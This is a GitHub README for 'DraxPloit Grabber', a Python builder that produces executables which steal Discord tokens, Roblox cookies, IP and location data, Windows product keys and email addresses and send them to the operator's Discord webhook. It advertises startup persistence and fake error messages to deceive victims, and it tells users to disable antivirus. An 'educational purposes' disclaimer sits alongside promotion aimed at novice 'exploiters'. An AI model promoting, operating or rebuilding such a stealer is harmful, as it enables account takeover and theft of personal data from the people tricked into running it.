# DraxPloit Grabber v1.5

Data Stealer written in **Python**

*enjoy the script fuggas*

#### :x: This program was made for educational purposes only. I do not condone or promote any illegal behavior that can be reproduced with my program! :x:

## :large_blue_circle: - Content
- [:100: - Features](#features)
- [:white_check_mark: - Requirements](#requirements)
- [:hammer: - Installing](#installing)
- [:toolbox:  - Usage](#usage)
- [:page_with_curl: - Explanation](#explanation)
- [:question:  - Help](#help)
- [All Features](#allfeatures)
- [:wave: - Authors](#authors)
- [:memo: - Changelog](#changelog)
- [:exclamation: - License](#license)

## <a id="features"></a> :100: - Features

- Builder (does all the coding for you) :sparkles:
- Steals IP, City etc. :round_pushpin:
- Grabs Discord Token :key:
- Roblox Cookie stealer :key:
- Startup infection :syringe:
- [**NEW**] Default and Custom Fake Error message :left_speech_bubble:
- No popups in .exe file!
- See [All Features](#allfeatures) for more
- More to be added! :heavy_plus_sign:

---

### <a id="requirements"></a> :white_check_mark: - Requirements

* Newest [Python](https://www.python.org) version (Version I use: [here](https://www.python.org/ftp/python/3.11.2/python-3.11.2-amd64.exe))
* The code in this [Repository](https://github.com/DraxFM/DraxPloit-Grabber/archive/refs/heads/main.zip)

---

### <a id="installing"></a> :hammer: - Installing

1. Install the files of this [Repository](https://github.com/DraxFM/DraxPloit-Grabber/archive/refs/heads/main.zip)
2. Extract the .zip file in the desired directory.
3. Run "setup.bat" (located in the folder) and wait until everything's installed
4. Run "start.bat"
5. Configure your file (see "Usage" for more information on how to set your file up)
6. Enjoy!

---

### <a id="usage"></a> :toolbox: - Usage

1. Create a Discord Server and go to server settings
2. Go to "Integrations" and click on "Create Webhook"
3. Set a webhook name and the specified text channel
4. Copy the Webhook URL (!!!)
5. Open DraxPloit Grabber and paste the webhook URL
6. Customize your file further
7. Your file is ready for usage!

<img src="https://i.ibb.co/f4Twmvf/Screenshot-9.png" width="500" height=auto>

### <a id="explanation"></a> :page_with_curl: - Explanation
**If you are new to exploiting, this might be in your interest**:  
When running the "**setup.bat**" file, a black window opens. Don't worry, this is just normal procedure even though it may look *malicious* at first glance. There will be text popping up in white colors. The "**setup.bat**" file installs all required libraries from "**requirements.txt**".  
  
Still, you mustn't delete the "**requirements.txt**" at all times. The builder still uses this file on execution!  
  
The same with "**start.bat**". Creating a software which has actual UI is really hard and honestly I am too lazy to do that. So that is why you configure your file in a black window (as seen in the picture above).  
  
You also might find the "**upx.exe**" file in the "upx" folder suspicious. But basically UPX (***Ultimate Packager for Executables***) is a well-known program. If you don't trust the one that's already in this repository feel free to install the original one from their own website and replace it with the already existing one.  
  
Lastly the compilation from **.py** to **.exe**. There will be files created in the folder and it may seem suspicious but this is needed to pack the Python code and the Python interpreter into one single file. There are tons of libraries that need to be packed, so give it time. In the DraxPloit Grabber console there will also be text popping up. This is for debug reasons and if something fails you can send me the output. It does not affect your system!  

---

### <a id="help"></a> :question: - Help

#### 1. Python allegedly "not found", Problems with PATH.

A common problem lots of users have with this program is not caused by me or my program, it's caused by Python. Upon installing Python you have to select the option "Add python.exe to PATH". Unfortunately this box is **NOT** ticked by default. If you already have Python installed, there's still a way to avoid a reinstallation. You can look up a tutorial on how to manually extend the Python PATHS. But here is a short instruction:  

1. Press windows key + R and type "sysdm.cpl" in the box that will pop up and press Enter.
2. Go to the Tab "Advanced" and click on the "Enviroment variables" button in the bottom right of the window.
3. On the upper box you should see the "User environment variables". Press on "New".
4. Put "Path" (case sensitive!) as the name and switch to the second bar and paste in the following:

      ```C:\Users\YOUR_NAME_HERE\AppData\Local\Programs\Python\Python311;C:\Users\YOUR_NAME_HERE\AppData\Local\Programs\Python\Python311\;C:\Users\YOUR_NAME_HERE\AppData\Local\Programs\Python\Python311\Scripts;C:\Users\YOUR_NAME_HERE\AppData\Local\Programs\Python\Python311\Scripts\```

5. Now replace every part called "YOUR_NAME_HERE", with the Windows user you are currently working with.
6. If you don't know your Windows user press windows key + R and type "cmd" in the box and press Enter. Now a black console will pop up. Type "whoami" and press Enter when everything's done loading. You will get your Device name and your current Device User seperated by a "\\". Example: desktop-rkd0n6c\john. In this case "john" would be the string you would have to replace with "YOUR_NAME_HERE".

<img src="https://i.ibb.co/vZJLP3X/example-Con.png">

7. Do not forget to press "OK"! Else you will need to redo everything!
8. If you still have problems with DraxPloit Logger please join my Discord or add my user. You can find the needed information in the "Authors" section.

---

#### 2. File is not there or not working properly when tested?

This can obviously be a bug, if there is an error shown, please contact me so I can improve my software. Otherwise, your scripts (mostly the .exe's) won't work because of your antivirus. As my scripts are not 100% undetected antivirusses might think that you installed a virus (even though you created it) and break it/parts of it or even delete it. To fix this, simply turn off your Antivirus and then create your file or add the file as extension so it doesn't get locked.  

## <a id="allfeatures"></a>All Features

```
Roblox cookies
Discord token
IP
City
Region
Country
Timezone
Org
Device Name
Device User
Registered Mail
Windows Product Key
Windows Version
Windows UUID
```

## <a id="authors"></a> :wave: - Authors

* [**Drax**](https://github.com/DraxFM) - *DraxPloit Grabber*

**Discord: [Drax#5934](https://discord.com/users/654343206275907585)**

Need help? Join the [**Discord**](https://discord.gg/sEXECdC3Et)!

Inspiration to start with python exploiting: [**KSCHdsc**](https://github.com/KSCHdsc) (Rest in peace, he got banned. May this serve as monument.)

## <a id="changelog"></a> :memo: - Changelog

```
06/08/2023: Added Mail logging
03/07/2023: Fixed startup infection  
03/06/2023: Added a banner to the program  
03/05/2023: Added Device Name and Device User logging  
03/05/2023: Big update: lots of bugfixes, UI changes, Fake error message system added  
03/05/2023: Minor bugfixes, optimization + new webhook test feature  
02/28/2023: Added badass token grabber supporting multiple browsers  
02/23/2023: Fixed fatal error  
02/20/2023: Added profile picture to webhook  
02/13/2023: Added Windows-Key, Windows-Version and UUID to information logger  
02/13/2023: Added Ascii-Art in Builder  
02/12/2023: Added startup infection  
02/12/2023: Fixed compilation process to exe  
02/12/2023: Released program  
```

## <a id="license"></a> :exclamation: - License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
